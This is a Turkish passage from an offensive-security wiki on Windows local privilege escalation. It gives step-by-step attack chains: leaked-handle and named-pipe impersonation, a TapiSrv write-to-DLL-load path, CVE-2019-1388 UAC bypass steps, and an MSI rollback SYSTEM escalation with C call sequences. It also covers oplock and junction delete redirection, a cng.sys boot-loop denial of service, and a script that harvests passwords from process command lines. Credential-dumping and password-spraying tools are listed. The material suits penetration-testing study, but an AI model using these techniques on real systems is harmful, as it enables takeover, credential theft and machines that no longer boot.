Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Sızdırılmış Handle'lar

**SYSTEM olarak çalışan bir işlemin tam erişimle yeni bir işlem açtığını** (`OpenProcess()`) düşünün. Aynı işlem, **ana işlemin tüm açık handle'larını devralan düşük ayrıcalıklı yeni bir işlem de oluşturur** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı işleme tam erişiminiz varsa**, `OpenProcess()` ile oluşturulmuş ayrıcalıklı işleme ait **açık handle'ı alabilir** ve **shellcode enjekte edebilirsiniz**.\
[Bu güvenlik açığının **nasıl tespit edilip istismar edileceği** hakkında daha fazla bilgi için bu örneği okuyun.](leaked-handle-exploitation.md)\
**Farklı izin düzeyleriyle (yalnızca tam erişim değil) devralınan işlemlerin ve thread'lerin diğer açık handle'larını nasıl test edip kötüye kullanabileceğinize** dair daha kapsamlı bir açıklama için [**bu diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe İstemci Taklidi

**Pipe** olarak adlandırılan paylaşılan bellek segmentleri, işlemler arası iletişimi ve veri aktarımını sağlar.

Windows, ilgisiz işlemlerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir istemci/sunucu mimarisine benzer.

Bir **istemci** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **sunucu**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **istemcinin kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir işlem** bulmak, kurduğunuz pipe ile etkileşime girdiğinde bu işlemin kimliğini benimseyerek **daha yüksek ayrıcalıklar kazanma** fırsatı sunar. Böyle bir saldırıyı gerçekleştirme talimatları için [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) yararlı kılavuzlar bulabilirsiniz.

Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini yakalamanıza** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privesc bulmak için tüm pipe'ları listeleyip görmenizi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv uzaktan DWORD yazımı ile RCE

Sunucu modundaki Telephony hizmeti (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) yolunu sunar. Uzaktan kimlik doğrulaması yapılmış bir istemci, mailslot tabanlı asenkron olay yolunu kötüye kullanarak `ClientAttach` çağrısını, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya keyfi **4 bayt yazma** işlemine dönüştürebilir; ardından Telephony admin hakları kazanıp hizmet olarak keyfi bir DLL yükleyebilir. İşleyişin tamamı:

- `pszDomainUser` değerini yazılabilir mevcut bir dosya yoluna ayarlayarak `ClientAttach` çağrısı yapın → hizmet dosyayı `CreateFileW(..., OPEN_EXISTING)` ile açar ve asenkron olay yazımları için kullanır.
- Her olay, `Initialize` çağrısındaki saldırgan denetimli `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) çağrısını tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile veriyi alın, ardından belirleyici yazımları tekrarlamak için kaydı kaldırın/kapatın.
- Kendinizi `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` bölümüne ekleyin, yeniden bağlanın ve ardından `GetUIDllName` çağrısını keyfi bir DLL yolu ile yaparak `TSPI_providerUIIdentify` kodunu `NETWORK SERVICE` olarak çalıştırın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta kod çalıştırabilecek dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderer'ları üzerinden Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir şema) tetikleyerek saldırgan denetimindeki dosyaları mevcut kullanıcı olarak çalıştırabilir. Bakınız:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için komut satırlarını izleme**

Bir kullanıcı olarak shell aldığınızda, **komut satırında kimlik bilgileri ileten** zamanlanmış görevler veya çalışan başka işlemler olabilir. Aşağıdaki script, her iki saniyede bir işlem komut satırlarını yakalar ve mevcut durumu önceki durumla karşılaştırarak değişiklikleri çıktı olarak verir.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## İşlemlerden parola çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir işlemi çalıştırmak mümkündür.

Bu, aynı güvenlik açığıyla hem ayrıcalıkları yükseltmeyi hem de UAC'yi atlatmayı mümkün kılar. Ayrıca herhangi bir şey yüklemek gerekmez ve işlem sırasında kullanılan ikili dosya Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu zafiyeti exploit etmek için aşağıdaki adımları gerçekleştirmek gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Tüm gerekli dosyalara ve bilgilere şu GitHub deposundan ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'ları** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junctions

Bir uygulama, tahmin edilebilir bir upload alt dizini oluşturabilir, kullanıcının sağladığı bir dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük yetkili bir kullanıcı, sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp NTFS junction ile değiştirebiliyorsa, yazma işlemi junction'ı izleyerek web üzerinden sunulan bir dizine yönlenebilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web hizmeti kimliğiyle çalışabilir. Bu, uygulamaya özgü bir arbitrary-write sınırıdır; yazılabilir bir upload dizininin veya mevcut bir junction'ın varlığı tek başına bunu kanıtlamaz.

Upload işleyicisindeki tam yol oluşturma şeklini ve zamanlamayı, kullanıcının alt dizindeki etkin silme/oluşturma izinlerini, hedef dizinin etkin ACL'lerini, yazma işlemini yapanın reparse point'leri izleyip izlemediğini ve web sunucusunun hedef dizindeki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazma işlemini yapanın ve web sunucusunun işlem kimliklerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak işleyicinin davranışını veya gelecekte yapılacak bir junction değişimini kanıtlayamaz. Çalıştırma bir hizmet hesabı altında gerçekleşiyorsa, ayrı bir token privilege yolunu değerlendirmeden önce **gerçek işlem token'ını** inceleyin.

## Arbitrary Folder Delete/Move/Rename'den SYSTEM EoP'ye

Teknik, [**bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanmıştır; exploit kodu [**burada**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) mevcuttur.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanmaktan ibarettir. Bunun için saldırganın, Windows Installer'ın diğer MSI paketlerini kaldırırken rollback dosyalarını depolamak amacıyla kullanacağı `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir. Bu rollback dosyaları daha sonra kötü amaçlı payload içerecek şekilde değiştirilmiş olur.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Düşük yetkili bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) üzerinden SYSTEM `msiexec.exe` hizmetine erişebilir. Tersine mühendislik çalışmaları, ilgili `IMsiServer` çağrılarının vtable offset `0xA0` konumundaki `MsiBeginTransactionW`, `0xC8` konumundaki `SetEEUIDirectoryAndFilter` ve `0x50` konumundaki `CleanupTempPackages` olduğunu ortaya çıkardı. Bu adlar ve offset'ler tersine mühendislikle belirlenmiştir ve farklı build'lerde değişiklik gösterebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, yalnızca sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken istemci kimliğine bürünür. Bu, istemcinin dizini silebildiğini kanıtlar ve bir reparse point'in izlenmesini önler; ancak denetlenen dosya nesnesini sonraki temizleme işlemine bağlamaz veya dosyanın Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` çağrısından sonra `SetEEUIDirectoryAndFilter`, istemcinin filter argümanından bağımsız olarak yolu klasör olarak zamanlar. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı istemcinin kontrolündeki yoldur ve `0x00000002` verisi klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` doğrudan temizleme işlemine girer. Yükseltilmiş worker, kayıt defteri değerlerini listeler ve klasör girdilerini yolun kaynağını denetlemeden recursive `FDeleteFolder` işlevine iletir. Normal kaldırma başarısız olursa kod ayrıca `LockdownPath` işlevini çağırır, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından çıkarılan asgari çağrı sırası şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi yerine path’in yeniden kullanılmasıdır. Saldırganın oluşturduğu `C:\Config.Msi` yolunu kaydedin, dizini silin ve Windows Installer’ın daha sonra aynı path’i korumalı rollback verileriyle yeniden oluşturmasını bekleyin. Temizleme işlemi eski `TempPackages` adına güvenir ve yeni dizini SYSTEM olarak siler. Reparse point gerekmediği için bu yöntem, `FILE_FLAG_OPEN_REPARSE_POINT` ve yönlendirme güveni önlemleriyle amaçlanan sınırı aşar.<sup>[[41]](#references)</sup>

Bu silme primitive’i aşağıdaki rollback zincirine uyar: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve yükleyici DACL’yi sıkılaştırmadan önce `WRITE_DAC` yetkili bir handle tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin veren bir DACL’yi geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkin olduğunda `CMsiTransaction::SetEEUIDirectoryAndFilter` metodunun `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu path’i düzeltti. COM çağrısı yine de başarı döndürebilir ancak saldırganın denetimindeki path’i artık `TempPackages` içine eklemez. Yama testi olarak metodun başarılı dönüşünü kullanmak yerine Nisan 2025 Windows güvenlik güncellemelerini uygulayın.<sup>[[41]](#references)[[42]](#references)</sup>

Tekniğin özeti şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` boş bırakılır)**

- Adım 1: MSI’ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Yönetici olmayan bir kullanıcının** çalıştırabilmesi için yükleyiciyi **"UAC Compliant"** olarak işaretleyin.
    - Yüklemeden sonra dosyaya ait bir **handle** açık tutun.

- Adım 2: Kaldırma İşlemini Başlatın
    - Aynı `.msi` dosyasını kaldırın.
    - Kaldırma işlemi dosyaları `C:\Config.Msi` dizinine taşımaya ve adlarını `.rbf` dosyalarıyla (rollback yedekleri) değiştirmeye başlar.
    - Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini tespit etmek için açık dosya handle’ını `GetFinalPathNameByHandle` ile **poll edin**.

- Adım 3: Özel Senkronizasyon
    - `.msi`, aşağıdakileri yapan bir **özel kaldırma action’ı (`SyncOnRbfWritten`)** içerir:
        - `.rbf` dosyasının yazıldığını bildirir.
        - Ardından kaldırma işlemine devam etmeden önce başka bir event’i **bekler**.

- Adım 4: `.rbf` Dosyasının Silinmesini Engelleyin
    - Bildirim geldiğinde, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — böylece **silinmesini engellersiniz**.
    - Ardından kaldırma işleminin tamamlanabilmesi için **yanıt sinyali gönderin**.
    - Windows Installer `.rbf` dosyasını silemez ve tüm içerikleri silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` Dosyasını Elle Silin
    - `.rbf` dosyasını kendiniz (saldırgan olarak) silin.
    - Artık **`C:\Config.Msi` boştur** ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM seviyesinde arbitrary folder delete zafiyetini tetikleyin**.

2. **Aşama 2 – Rollback Script’lerini Kötü Amaçlı Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` Dizininin Zayıf ACL’lerle Yeniden Oluşturulması
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL’ler** ayarlayın (ör. Everyone:F) ve `WRITE_DAC` yetkili bir handle’ı **açık tutun**.

- Adım 7: Başka Bir Yükleme Çalıştırın
    - `.msi` dosyasını yeniden yükleyin; şu değerleri kullanın:
        - `TARGETDIR`: Yazılabilir bir konum.
        - `ERROROUT`: Zorunlu hata oluşturan bir değişken.
    - Bu yükleme, `.rbs` ve `.rbf` dosyalarını okuyan **rollback’i** yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` Dosyasını İzleyin
    - Yeni bir `.rbs` görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını alın.

- Adım 9: Rollback Öncesinde Senkronize Olun
    - `.msi`, aşağıdakileri yapan bir **özel yükleme action’ı (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event sinyali gönderir.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL’leri Yeniden Uygulayın
    - `.rbs created` event’ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` dizinine **güçlü ACL’leri yeniden uygular**.
        - Ancak hâlâ `WRITE_DAC` yetkili bir handle’ınız olduğu için **zayıf ACL’leri yeniden uygulayabilirsiniz**.

> ACL’ler **yalnızca handle açılırken denetlenir**; dolayısıyla klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` Dosyalarını Bırakın
    - `.rbs` dosyasını, Windows’a şunları yaptıran **sahte bir rollback script’iyle** değiştirin:
        - `.rbf` dosyanızı (kötü amaçlı DLL) **ayrıcalıklı bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemek.
    - **SYSTEM seviyesinde kötü amaçlı bir payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback’i Tetikleyin
    - Yükleyicinin devam etmesi için senkronizasyon event’ine sinyal gönderin.
    - Yüklemeyi belirli bir noktada **bilerek başarısız kılmak** üzere bir **type 19 custom action (`ErrorOut`)** yapılandırılmıştır.
    - Bu, **rollback’in başlamasına** neden olur.

- Adım 13: SYSTEM DLL’inizi Yükler
    - Windows Installer:
        - Kötü amaçlı `.rbs` dosyanızı okur.
        - `.rbf` DLL’inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir path’te** kötü amaçlı DLL’iniz bulunur.

- Son Adım: SYSTEM Kodunu Çalıştırın
    - Ele geçirdiğiniz DLL’i yükleyen, güvenilir ve **auto-elevated** bir binary’yi (ör. `osk.exe`) çalıştırın.
    - **İşte**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename’den SYSTEM EoP’ye

Ana MSI rollback tekniği (bir önceki teknik), **tüm bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya zafiyetiniz yalnızca **arbitrary file deletion** olanağı sağlıyorsa?

**NTFS internals**’ı kullanabilirsiniz: her klasörün şu adlı gizli bir alternate data stream’i vardır:**

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **indeks metaverilerini** depolar.

Bu nedenle, bir klasörün **`::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS klasörün tamamını dosya sisteminden **kaldırır**.

Bunu şu standart dosya silme API'leriyle yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* delete API çağırıyor olsanız da, **klasörün kendisini siler**.

### Klasör İçeriğini Silme'den SYSTEM EoP'ye
Primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyor, ancak saldırganın kontrolündeki bir klasörün *içeriğini* silmenize **izin veriyorsa** ne olur?

1. Adım 1: Tuzak klasörü ve dosyası oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerinde bir **oplock** ayarlayın
- Ayrıcalıklı bir işlem `file1.txt` dosyasını silmeye çalıştığında oplock **yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Adım 3: SYSTEM sürecini tetikleyin (ör. `SilentCleanup`)
- Bu süreç klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock devreye girer** ve kontrolü callback'inize verir.

4. Adım 4: Oplock callback'i içinde — silme işlemini yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
    - Bu, oplock'u bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'un zamanından önce serbest bırakılmasına neden olur.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştürün:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS iç akışını hedefler — bunu silmek klasörü siler.

5. Adım 5: Oplock'u bırakın
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak junction + symlink nedeniyle aslında sildiği şey şudur:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### İstediğiniz Klasörü Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin olarak istediğiniz klasörü oluşturmanıza** olanak tanıyan bir primitive'den yararlanın — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

**Kritik bir Windows driver'ının** adını taşıyan bir **klasör** (dosya değil) oluşturun. Örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode sürücüsüne karşılık gelir.
- Bunu **önceden bir klasör olarak oluşturursanız**, Windows önyükleme sırasında gerçek sürücüyü yükleyemez.
- Ardından Windows, önyükleme sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü çözümleyemez** ve **önyükleme sırasında çöker veya durur**.
- **Geri dönüş seçeneği yoktur** ve harici müdahale (ör. önyükleme onarımı veya diske erişim) olmadan **kurtarma mümkün değildir**.

### Ayrıcalıklı günlük/yedekleme yollarından ve OM symlink'lerinden keyfi dosya üzerine yazmaya / önyükleme DoS'una

Bir **ayrıcalıklı hizmet**, **yazılabilir bir yapılandırmadan** okuduğu yola günlük/dışa aktarma yazdığında, **Object Manager symlink'leri + NTFS mount point'leri** ile bu yolu yönlendirerek ayrıcalıklı yazma işlemini keyfi bir dosyanın üzerine yazmaya dönüştürün (**SeCreateSymbolicLinkPrivilege olmadan bile**).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu depolayan yapılandırma saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumuna mount point ve bir OM file symlink oluşturabilme (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (günlük, dışa aktarma, rapor).

**Örnek zincir**
1. Ayrıcalıklı günlük hedefini bulmak için yapılandırmayı okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Yolu yönetici yetkisi olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin logu yazmasını bekleyin (ör. yönetici "send test SMS" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` konumuna yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows'un değiştirilmiş sürücü yolunu yüklemesine zorlar → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir servisin yazma amacıyla açacağı korumalı herhangi bir dosya için de genellenebilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir, ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopyanın yüklenmesi denenebilir; bu da bozuk veriler için güvenilir bir DoS hedefi oluşturur.



## **Yüksek Bütünlükten SYSTEM'e**

### **Yeni servis**

Zaten High Integrity düzeyinde çalışan bir süreçteyseniz, **SYSTEM'e giden yol** yalnızca **yeni bir servis oluşturup çalıştırarak** kolayca aşılabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process içinden **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[İlgili registry key'leri ve bir _.msi_ paketi yükleme hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate ayrıcalığından System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token ayrıcalıklarına

Bu token ayrıcalıklarına sahipseniz (muhtemelen bunu zaten High Integrity olan bir process'te bulursunuz), SeDebug ayrıcalığıyla **neredeyse her process'i** (korumalı process'ler hariç) **açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **istediğiniz bir process'i oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan bir process seçmek** için kullanılır (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` içinde privilege escalation yapmak için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından **`SeImpersonate`** ayrıcalığını kullanarak pipe'ı oluşturan **server**, pipe istemcisinin (service'in) **token'ını taklit ederek** SYSTEM ayrıcalıkları elde edebilir.\
[**Named pipe'lar hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Named pipe'ları kullanarak High Integrity'den System'e geçiş örneğini okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'yi **hijack etmeyi** başarırsanız, bu izinlerle istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking, bu tür privilege escalation için de yararlıdır. Üstelik dll'leri yüklemek için kullanılan klasörlerde **yazma izinlerine** sahip olacağından, bunu **High Integrity bir process'ten gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında daha fazlasını** [**buradan öğrenebilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten tam ayrıcalıklara

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binary'leri](https://github.com/ropnop/impacket_static_binaries)

## Yararlı araçlar

**Windows'taki yerel privilege escalation vektörlerini bulmak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP'de kayıtlı oturum bilgilerini çıkarır. Yerel kullanımda -Thorough seçeneğini kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (Watson nedeniyle KULLANIM DIŞI)\
